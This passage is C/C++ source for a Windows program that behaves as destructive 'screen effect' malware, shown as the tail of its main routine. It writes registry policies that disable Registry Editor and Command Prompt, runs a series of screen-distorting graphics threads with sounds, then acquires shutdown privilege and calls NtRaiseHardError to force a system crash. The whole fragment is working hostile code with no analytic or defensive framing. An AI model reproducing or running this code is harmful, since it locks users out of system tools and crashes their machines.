            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
            Sleep(5000);
            HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
            HANDLE thread1dot1 = CreateThread(0, 0, question, 0, 0, 0);
            sound1();
            Sleep(30000);
            TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread2 = CreateThread(0, 0, blur, 0, 0, 0);
            HANDLE thread2dot1 = CreateThread(0, 0, invcc, 0, 0, 0);
            sound2();
            Sleep(30000);
            TerminateThread(thread2, 0);
            CloseHandle(thread2);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            CreateThread(0, 0, opener, 0, 0, 0);
            CreateThread(0, 0, textz, 0, 0, 0);
            HANDLE thread3 = CreateThread(0, 0, shader2, 0, 0, 0);
            HANDLE thread3dot1 = CreateThread(0, 0, textout, 0, 0, 0);
            sound3();
            Sleep(30000);
            TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread4 = CreateThread(0, 0, hell1, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, radius, 0, 0, 0);
            sound4();
            Sleep(30000);
            TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread5 = CreateThread(0, 0, shader3, 0, 0, 0);
            HANDLE thread5dot1 = CreateThread(0, 0, darker, 0, 0, 0);
            sound5();
            Sleep(30000);
            TerminateThread(thread5, 0);
            CloseHandle(thread5);
            TerminateThread(thread5dot1, 0);
            CloseHandle(thread5dot1);
            InvalidateRect(0, 0, 0);
            Sleep(100);
            HANDLE thread6 = CreateThread(0, 0, shader4, 0, 0, 0);
            HANDLE beeping = CreateThread(0, 0, beep, 0, 0, 0);
            Sleep(5000);
            BOOLEAN bl;
            DWORD response;
            NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
            RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
            RtlAdjustPrivilege(19, 1, 0, &bl);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
            Sleep(-1);
        }
    }
}